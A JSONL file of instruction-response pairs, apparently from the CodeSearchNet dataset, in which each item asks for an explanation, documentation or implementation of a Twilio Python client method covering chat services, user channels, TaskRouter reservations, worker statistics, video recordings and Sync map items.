{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, channel_sid):\n        return UserChannelContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            user_sid=self._solution['user_sid'],\n            channel_sid=channel_sid,\n        )", "response": "Constructs a UserChannelContext\n\n        :param channel_sid: The SID of the Channel that has the User Channel to fetch\n\n        :returns: twilio.rest.chat.v2.service.user.user_channel.UserChannelContext\n        :rtype: twilio.rest.chat.v2.service.user.user_channel.UserChannelContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return UserChannelInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            user_sid=self._solution['user_sid'],\n        )", "response": "Build an instance of UserChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching a UserChannelInstance :returns: Fetched UserChannelInstance :rtype: twilio.rest.chat.v2.service.user.user_channel.UserChannelInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a UserChannelInstance\n\n        :returns: Fetched UserChannelInstance\n        :rtype: twilio.rest.chat.v2.service.user.user_channel.UserChannelInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return UserChannelInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            user_sid=self._solution['user_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, notification_level):\n        data = values.of({'NotificationLevel': notification_level, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return UserChannelInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            user_sid=self._solution['user_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )", "response": "Update the UserChannelInstance\n\n        :param UserChannelInstance.NotificationLevel notification_level: The push notification level to assign to the User Channel\n\n        :returns: Updated UserChannelInstance\n        :rtype: twilio.rest.chat.v2.service.user.user_channel.UserChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = UserChannelContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                user_sid=self._solution['user_sid'],\n                channel_sid=self._solution['channel_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the user_channel"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstreaming the reservation records from the TaskRouter API as a list.", "response": "def list(self, reservation_status=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists ReservationInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param ReservationInstance.Status reservation_status: Filter by a worker's reservation status\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationInstance]\n        \"\"\"\n        return list(self.stream(reservation_status=reservation_status, limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, sid):\n        return ReservationContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            worker_sid=self._solution['worker_sid'],\n            sid=sid,\n        )", "response": "Constructs a ReservationContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of ReservationInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ReservationInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.reservation.ReservationInstance\n        \"\"\"\n        return ReservationInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            worker_sid=self._solution['worker_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self):\n        return WorkerStatisticsContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            worker_sid=self._solution['worker_sid'],\n        )", "response": "Constructs a WorkerStatisticsContext\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return WorkerStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            worker_sid=self._solution['worker_sid'],\n        )", "response": "Build an instance of WorkerStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkerStatisticsContext for this WorkerStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkerStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                worker_sid=self._solution['worker_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nfetch a WorkerStatisticsInstance :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past. :param datetime start_date: Filter cumulative statistics by a start date. :param datetime end_date: Filter cumulative statistics by a end date. :param unicode task_channel: Filter cumulative statistics by TaskChannel. :returns: Fetched WorkerStatisticsInstance :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsInstance", "response": "def fetch(self, minutes=values.unset, start_date=values.unset,\n              end_date=values.unset, task_channel=values.unset):\n        \"\"\"\n        Fetch a WorkerStatisticsInstance\n\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param datetime end_date: Filter cumulative statistics by a end date.\n        :param unicode task_channel: Filter cumulative statistics by TaskChannel.\n\n        :returns: Fetched WorkerStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_statistics.WorkerStatisticsInstance\n        \"\"\"\n        return self._proxy.fetch(\n            minutes=minutes,\n            start_date=start_date,\n            end_date=end_date,\n            task_channel=task_channel,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef page(self, status=values.unset, source_sid=values.unset,\n             grouping_sid=values.unset, date_created_after=values.unset,\n             date_created_before=values.unset, media_type=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of RecordingInstance records from the API.\n        Request is executed immediately\n\n        :param RecordingInstance.Status status: Only show Recordings with the given status.\n        :param unicode source_sid: Only show the Recordings with the given source Sid.\n        :param unicode grouping_sid: Only show Recordings that have this GroupingSid.\n        :param datetime date_created_after: Only show Recordings that started on or after this ISO8601 date-time with timezone.\n        :param datetime date_created_before: Only show Recordings that started before this ISO8601 date-time with timezone.\n        :param RecordingInstance.Type media_type: Only show Recordings that have this media type.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of RecordingInstance\n        :rtype: twilio.rest.video.v1.recording.RecordingPage\n        \"\"\"\n        params = values.of({\n            'Status': status,\n            'SourceSid': source_sid,\n            'GroupingSid': serialize.map(grouping_sid, lambda e: e),\n            'DateCreatedAfter': serialize.iso8601_datetime(date_created_after),\n            'DateCreatedBefore': serialize.iso8601_datetime(date_created_before),\n            'MediaType': media_type,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return RecordingPage(self._version, response, self._solution)", "response": "Retrieve a single page of RecordingInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, key):\n        return SyncMapItemContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n            key=key,\n        )", "response": "Constructs a SyncMapItemContext\n\n        :param key: The key\n\n        :returns: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemContext\n        :rtype: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds an instance of SyncMapItemInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of SyncMapItemInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemInstance\n        \"\"\"\n        return SyncMapItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nfetch a SyncMapItemInstance :returns: Fetched SyncMapItemInstance :rtype: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a SyncMapItemInstance\n\n        :returns: Fetched SyncMapItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SyncMapItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n            key=self._solution['key'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, data):\n        data = values.of({'Data': serialize.object(data), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncMapItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            map_sid=self._solution['map_sid'],\n            key=self._solution['key'],\n        )", "response": "Update the SyncMapItemInstance\n\n        :param dict data: The data\n\n        :returns: Updated SyncMapItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SyncMapItemContext for this SyncMapItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_map.sync_map_item.SyncMapItemContext\n        \"\"\"\n        if self._context is None:\n            self._context = SyncMapItemContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                map_sid=self._solution['map_sid'],\n                key=self._solution['key'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new ServiceInstance with the specified friendly name.", "response": "def create(self, friendly_name):\n        \"\"\"\n        Create a new ServiceInstance\n\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Newly created ServiceInstance\n        :rtype: twilio.rest.chat.v2.service.ServiceInstance\n        \"\"\"\n        data = values.of({'FriendlyName': friendly_name, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, friendly_name=values.unset,\n               default_service_role_sid=values.unset,\n               default_channel_role_sid=values.unset,\n               default_channel_creator_role_sid=values.unset,\n               read_status_enabled=values.unset, reachability_enabled=values.unset,\n               typing_indicator_timeout=values.unset,\n               consumption_report_interval=values.unset,\n               notifications_new_message_enabled=values.unset,\n               notifications_new_message_template=values.unset,\n               notifications_new_message_sound=values.unset,\n               notifications_new_message_badge_count_enabled=values.unset,\n               notifications_added_to_channel_enabled=values.unset,\n               notifications_added_to_channel_template=values.unset,\n               notifications_added_to_channel_sound=values.unset,\n               notifications_removed_from_channel_enabled=values.unset,\n               notifications_removed_from_channel_template=values.unset,\n               notifications_removed_from_channel_sound=values.unset,\n               notifications_invited_to_channel_enabled=values.unset,\n               notifications_invited_to_channel_template=values.unset,\n               notifications_invited_to_channel_sound=values.unset,\n               pre_webhook_url=values.unset, post_webhook_url=values.unset,\n               webhook_method=values.unset, webhook_filters=values.unset,\n               limits_channel_members=values.unset,\n               limits_user_channels=values.unset,\n               media_compatibility_message=values.unset,\n               pre_webhook_retry_count=values.unset,\n               post_webhook_retry_count=values.unset,\n               notifications_log_enabled=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode default_service_role_sid: The service role assigned to users when they are added to the service\n        :param unicode default_channel_role_sid: The channel role assigned to users when they are added to a channel\n        :param unicode default_channel_creator_role_sid: The channel role assigned to a channel creator when they join a new channel\n        :param bool read_status_enabled: Whether to enable the Message Consumption Horizon feature\n        :param bool reachability_enabled: Whether to enable the Reachability Indicator feature for this Service instance\n        :param unicode typing_indicator_timeout: How long in seconds to wait before assuming the user is no longer typing\n        :param unicode consumption_report_interval: DEPRECATED\n        :param bool notifications_new_message_enabled: Whether to send a notification when a new message is added to a channel\n        :param unicode notifications_new_message_template: The template to use to create the notification text displayed when a new message is added to a channel\n        :param unicode notifications_new_message_sound: The name of the sound to play when a new message is added to a channel\n        :param bool notifications_new_message_badge_count_enabled: Whether the new message badge is enabled\n        :param bool notifications_added_to_channel_enabled: Whether to send a notification when a member is added to a channel\n        :param unicode notifications_added_to_channel_template: The template to use to create the notification text displayed when a member is added to a channel\n        :param unicode notifications_added_to_channel_sound: The name of the sound to play when a member is added to a channel\n        :param bool notifications_removed_from_channel_enabled: Whether to send a notification to a user when they are removed from a channel\n        :param unicode notifications_removed_from_channel_template: The template to use to create the notification text displayed to a user when they are removed\n        :param unicode notifications_removed_from_channel_sound: The name of the sound to play to a user when they are removed from a channel\n        :param bool notifications_invited_to_channel_enabled: Whether to send a notification when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_template: The template to use to create the notification text displayed when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_sound: The name of the sound to play when a user is invited to a channel\n        :param unicode pre_webhook_url: The webhook URL for pre-event webhooks\n        :param unicode post_webhook_url: The URL for post-event webhooks\n        :param unicode webhook_method: The HTTP method  to use for both PRE and POST webhooks\n        :param unicode webhook_filters: The list of WebHook events that are enabled for this Service instance\n        :param unicode limits_channel_members: The maximum number of Members that can be added to Channels within this Service\n        :param unicode limits_user_channels: The maximum number of Channels Users can be a Member of within this Service\n        :param unicode media_compatibility_message: The message to send when a media message has no text\n        :param unicode pre_webhook_retry_count: Count of times webhook will be retried in case of timeout or 429/503/504 HTTP responses\n        :param unicode post_webhook_retry_count: The number of times calls to the `post_webhook_url` will be retried\n        :param bool notifications_log_enabled: Whether to log notifications\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.chat.v2.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'DefaultServiceRoleSid': default_service_role_sid,\n            'DefaultChannelRoleSid': default_channel_role_sid,\n            'DefaultChannelCreatorRoleSid': default_channel_creator_role_sid,\n            'ReadStatusEnabled': read_status_enabled,\n            'ReachabilityEnabled': reachability_enabled,\n            'TypingIndicatorTimeout': typing_indicator_timeout,\n            'ConsumptionReportInterval': consumption_report_interval,\n            'Notifications.NewMessage.Enabled': notifications_new_message_enabled,\n            'Notifications.NewMessage.Template': notifications_new_message_template,\n            'Notifications.NewMessage.Sound': notifications_new_message_sound,\n            'Notifications.NewMessage.BadgeCountEnabled': notifications_new_message_badge_count_enabled,\n            'Notifications.AddedToChannel.Enabled': notifications_added_to_channel_enabled,\n            'Notifications.AddedToChannel.Template': notifications_added_to_channel_template,\n            'Notifications.AddedToChannel.Sound': notifications_added_to_channel_sound,\n            'Notifications.RemovedFromChannel.Enabled': notifications_removed_from_channel_enabled,\n            'Notifications.RemovedFromChannel.Template': notifications_removed_from_channel_template,\n            'Notifications.RemovedFromChannel.Sound': notifications_removed_from_channel_sound,\n            'Notifications.InvitedToChannel.Enabled': notifications_invited_to_channel_enabled,\n            'Notifications.InvitedToChannel.Template': notifications_invited_to_channel_template,\n            'Notifications.InvitedToChannel.Sound': notifications_invited_to_channel_sound,\n            'PreWebhookUrl': pre_webhook_url,\n            'PostWebhookUrl': post_webhook_url,\n            'WebhookMethod': webhook_method,\n            'WebhookFilters': serialize.map(webhook_filters, lambda e: e),\n            'Limits.ChannelMembers': limits_channel_members,\n            'Limits.UserChannels': limits_user_channels,\n            'Media.CompatibilityMessage': media_compatibility_message,\n            'PreWebhookRetryCount': pre_webhook_retry_count,\n            'PostWebhookRetryCount': post_webhook_retry_count,\n            'Notifications.LogEnabled': notifications_log_enabled,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, sid=self._solution['sid'], )", "response": "Update the ServiceInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode default_service_role_sid: The service role assigned to users when they are added to the service\n        :param unicode default_channel_role_sid: The channel role assigned to users when they are added to a channel\n        :param unicode default_channel_creator_role_sid: The channel role assigned to a channel creator when they join a new channel\n        :param bool read_status_enabled: Whether to enable the Message Consumption Horizon feature\n        :param bool reachability_enabled: Whether to enable the Reachability Indicator feature for this Service instance\n        :param unicode typing_indicator_timeout: How long in seconds to wait before assuming the user is no longer typing\n        :param unicode consumption_report_interval: DEPRECATED\n        :param bool notifications_new_message_enabled: Whether to send a notification when a new message is added to a channel\n        :param unicode notifications_new_message_template: The template to use to create the notification text displayed when a new message is added to a channel\n        :param unicode notifications_new_message_sound: The name of the sound to play when a new message is added to a channel\n        :param bool notifications_new_message_badge_count_enabled: Whether the new message badge is enabled\n        :param bool notifications_added_to_channel_enabled: Whether to send a notification when a member is added to a channel\n        :param unicode notifications_added_to_channel_template: The template to use to create the notification text displayed when a member is added to a channel\n        :param unicode notifications_added_to_channel_sound: The name of the sound to play when a member is added to a channel\n        :param bool notifications_removed_from_channel_enabled: Whether to send a notification to a user when they are removed from a channel\n        :param unicode notifications_removed_from_channel_template: The template to use to create the notification text displayed to a user when they are removed\n        :param unicode notifications_removed_from_channel_sound: The name of the sound to play to a user when they are removed from a channel\n        :param bool notifications_invited_to_channel_enabled: Whether to send a notification when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_template: The template to use to create the notification text displayed when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_sound: The name of the sound to play when a user is invited to a channel\n        :param unicode pre_webhook_url: The webhook URL for pre-event webhooks\n        :param unicode post_webhook_url: The URL for post-event webhooks\n        :param unicode webhook_method: The HTTP method  to use for both PRE and POST webhooks\n        :param unicode webhook_filters: The list of WebHook events that are enabled for this Service instance\n        :param unicode limits_channel_members: The maximum number of Members that can be added to Channels within this Service\n        :param unicode limits_user_channels: The maximum number of Channels Users can be a Member of within this Service\n        :param unicode media_compatibility_message: The message to send when a media message has no text\n        :param unicode pre_webhook_retry_count: Count of times webhook will be retried in case of timeout or 429/503/504 HTTP responses\n        :param unicode post_webhook_retry_count: The number of times calls to the `post_webhook_url` will be retried\n        :param bool notifications_log_enabled: Whether to log notifications\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.chat.v2.service.ServiceInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef channels(self):\n        if self._channels is None:\n            self._channels = ChannelList(self._version, service_sid=self._solution['sid'], )\n        return self._channels", "response": "Access the channels\n\n        :returns: twilio.rest.chat.v2.service.channel.ChannelList\n        :rtype: twilio.rest.chat.v2.service.channel.ChannelList"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef roles(self):\n        if self._roles is None:\n            self._roles = RoleList(self._version, service_sid=self._solution['sid'], )\n        return self._roles", "response": "Access the roles\n\n        :returns: twilio.rest.chat.v2.service.role.RoleList\n        :rtype: twilio.rest.chat.v2.service.role.RoleList"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef users(self):\n        if self._users is None:\n            self._users = UserList(self._version, service_sid=self._solution['sid'], )\n        return self._users", "response": "Access the users\n\n        :returns: twilio.rest.chat.v2.service.user.UserList\n        :rtype: twilio.rest.chat.v2.service.user.UserList"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the bindings :returns: twilio.rest.chat.v2.service.binding.BindingList :rtype: twilio.rest.chat.v2.service.binding.BindingList", "response": "def bindings(self):\n        \"\"\"\n        Access the bindings\n\n        :returns: twilio.rest.chat.v2.service.binding.BindingList\n        :rtype: twilio.rest.chat.v2.service.binding.BindingList\n        \"\"\"\n        if self._bindings is None:\n            self._bindings = BindingList(self._version, service_sid=self._solution['sid'], )\n        return self._bindings"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, friendly_name=values.unset,\n               default_service_role_sid=values.unset,\n               default_channel_role_sid=values.unset,\n               default_channel_creator_role_sid=values.unset,\n               read_status_enabled=values.unset, reachability_enabled=values.unset,\n               typing_indicator_timeout=values.unset,\n               consumption_report_interval=values.unset,\n               notifications_new_message_enabled=values.unset,\n               notifications_new_message_template=values.unset,\n               notifications_new_message_sound=values.unset,\n               notifications_new_message_badge_count_enabled=values.unset,\n               notifications_added_to_channel_enabled=values.unset,\n               notifications_added_to_channel_template=values.unset,\n               notifications_added_to_channel_sound=values.unset,\n               notifications_removed_from_channel_enabled=values.unset,\n               notifications_removed_from_channel_template=values.unset,\n               notifications_removed_from_channel_sound=values.unset,\n               notifications_invited_to_channel_enabled=values.unset,\n               notifications_invited_to_channel_template=values.unset,\n               notifications_invited_to_channel_sound=values.unset,\n               pre_webhook_url=values.unset, post_webhook_url=values.unset,\n               webhook_method=values.unset, webhook_filters=values.unset,\n               limits_channel_members=values.unset,\n               limits_user_channels=values.unset,\n               media_compatibility_message=values.unset,\n               pre_webhook_retry_count=values.unset,\n               post_webhook_retry_count=values.unset,\n               notifications_log_enabled=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode default_service_role_sid: The service role assigned to users when they are added to the service\n        :param unicode default_channel_role_sid: The channel role assigned to users when they are added to a channel\n        :param unicode default_channel_creator_role_sid: The channel role assigned to a channel creator when they join a new channel\n        :param bool read_status_enabled: Whether to enable the Message Consumption Horizon feature\n        :param bool reachability_enabled: Whether to enable the Reachability Indicator feature for this Service instance\n        :param unicode typing_indicator_timeout: How long in seconds to wait before assuming the user is no longer typing\n        :param unicode consumption_report_interval: DEPRECATED\n        :param bool notifications_new_message_enabled: Whether to send a notification when a new message is added to a channel\n        :param unicode notifications_new_message_template: The template to use to create the notification text displayed when a new message is added to a channel\n        :param unicode notifications_new_message_sound: The name of the sound to play when a new message is added to a channel\n        :param bool notifications_new_message_badge_count_enabled: Whether the new message badge is enabled\n        :param bool notifications_added_to_channel_enabled: Whether to send a notification when a member is added to a channel\n        :param unicode notifications_added_to_channel_template: The template to use to create the notification text displayed when a member is added to a channel\n        :param unicode notifications_added_to_channel_sound: The name of the sound to play when a member is added to a channel\n        :param bool notifications_removed_from_channel_enabled: Whether to send a notification to a user when they are removed from a channel\n        :param unicode notifications_removed_from_channel_template: The template to use to create the notification text displayed to a user when they are removed\n        :param unicode notifications_removed_from_channel_sound: The name of the sound to play to a user when they are removed from a channel\n        :param bool notifications_invited_to_channel_enabled: Whether to send a notification when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_template: The template to use to create the notification text displayed when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_sound: The name of the sound to play when a user is invited to a channel\n        :param unicode pre_webhook_url: The webhook URL for pre-event webhooks\n        :param unicode post_webhook_url: The URL for post-event webhooks\n        :param unicode webhook_method: The HTTP method  to use for both PRE and POST webhooks\n        :param unicode webhook_filters: The list of WebHook events that are enabled for this Service instance\n        :param unicode limits_channel_members: The maximum number of Members that can be added to Channels within this Service\n        :param unicode limits_user_channels: The maximum number of Channels Users can be a Member of within this Service\n        :param unicode media_compatibility_message: The message to send when a media message has no text\n        :param unicode pre_webhook_retry_count: Count of times webhook will be retried in case of timeout or 429/503/504 HTTP responses\n        :param unicode post_webhook_retry_count: The number of times calls to the `post_webhook_url` will be retried\n        :param bool notifications_log_enabled: Whether to log notifications\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.chat.v2.service.ServiceInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            default_service_role_sid=default_service_role_sid,\n            default_channel_role_sid=default_channel_role_sid,\n            default_channel_creator_role_sid=default_channel_creator_role_sid,\n            read_status_enabled=read_status_enabled,\n            reachability_enabled=reachability_enabled,\n            typing_indicator_timeout=typing_indicator_timeout,\n            consumption_report_interval=consumption_report_interval,\n            notifications_new_message_enabled=notifications_new_message_enabled,\n            notifications_new_message_template=notifications_new_message_template,\n            notifications_new_message_sound=notifications_new_message_sound,\n            notifications_new_message_badge_count_enabled=notifications_new_message_badge_count_enabled,\n            notifications_added_to_channel_enabled=notifications_added_to_channel_enabled,\n            notifications_added_to_channel_template=notifications_added_to_channel_template,\n            notifications_added_to_channel_sound=notifications_added_to_channel_sound,\n            notifications_removed_from_channel_enabled=notifications_removed_from_channel_enabled,\n            notifications_removed_from_channel_template=notifications_removed_from_channel_template,\n            notifications_removed_from_channel_sound=notifications_removed_from_channel_sound,\n            notifications_invited_to_channel_enabled=notifications_invited_to_channel_enabled,\n            notifications_invited_to_channel_template=notifications_invited_to_channel_template,\n            notifications_invited_to_channel_sound=notifications_invited_to_channel_sound,\n            pre_webhook_url=pre_webhook_url,\n            post_webhook_url=post_webhook_url,\n            webhook_method=webhook_method,\n            webhook_filters=webhook_filters,\n            limits_channel_members=limits_channel_members,\n            limits_user_channels=limits_user_channels,\n            media_compatibility_message=media_compatibility_message,\n            pre_webhook_retry_count=pre_webhook_retry_count,\n            post_webhook_retry_count=post_webhook_retry_count,\n            notifications_log_enabled=notifications_log_enabled,\n        )", "response": "Update the ServiceInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode default_service_role_sid: The service role assigned to users when they are added to the service\n        :param unicode default_channel_role_sid: The channel role assigned to users when they are added to a channel\n        :param unicode default_channel_creator_role_sid: The channel role assigned to a channel creator when they join a new channel\n        :param bool read_status_enabled: Whether to enable the Message Consumption Horizon feature\n        :param bool reachability_enabled: Whether to enable the Reachability Indicator feature for this Service instance\n        :param unicode typing_indicator_timeout: How long in seconds to wait before assuming the user is no longer typing\n        :param unicode consumption_report_interval: DEPRECATED\n        :param bool notifications_new_message_enabled: Whether to send a notification when a new message is added to a channel\n        :param unicode notifications_new_message_template: The template to use to create the notification text displayed when a new message is added to a channel\n        :param unicode notifications_new_message_sound: The name of the sound to play when a new message is added to a channel\n        :param bool notifications_new_message_badge_count_enabled: Whether the new message badge is enabled\n        :param bool notifications_added_to_channel_enabled: Whether to send a notification when a member is added to a channel\n        :param unicode notifications_added_to_channel_template: The template to use to create the notification text displayed when a member is added to a channel\n        :param unicode notifications_added_to_channel_sound: The name of the sound to play when a member is added to a channel\n        :param bool notifications_removed_from_channel_enabled: Whether to send a notification to a user when they are removed from a channel\n        :param unicode notifications_removed_from_channel_template: The template to use to create the notification text displayed to a user when they are removed\n        :param unicode notifications_removed_from_channel_sound: The name of the sound to play to a user when they are removed from a channel\n        :param bool notifications_invited_to_channel_enabled: Whether to send a notification when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_template: The template to use to create the notification text displayed when a user is invited to a channel\n        :param unicode notifications_invited_to_channel_sound: The name of the sound to play when a user is invited to a channel\n        :param unicode pre_webhook_url: The webhook URL for pre-event webhooks\n        :param unicode post_webhook_url: The URL for post-event webhooks\n        :param unicode webhook_method: The HTTP method  to use for both PRE and POST webhooks\n        :param unicode webhook_filters: The list of WebHook events that are enabled for this Service instance\n        :param unicode limits_channel_members: The maximum number of Members that can be added to Channels within this Service\n        :param unicode limits_user_channels: The maximum number of Channels Users can be a Member of within this Service\n        :param unicode media_compatibility_message: The message to send when a media message has no text\n        :param unicode pre_webhook_retry_count: Count of times webhook will be retried in case of timeout or 429/503/504 HTTP responses\n        :param unicode post_webhook_retry_count: The number of times calls to the `post_webhook_url` will be retried\n        :param bool notifications_log_enabled: Whether to log notifications\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.chat.v2.service.ServiceInstance"}
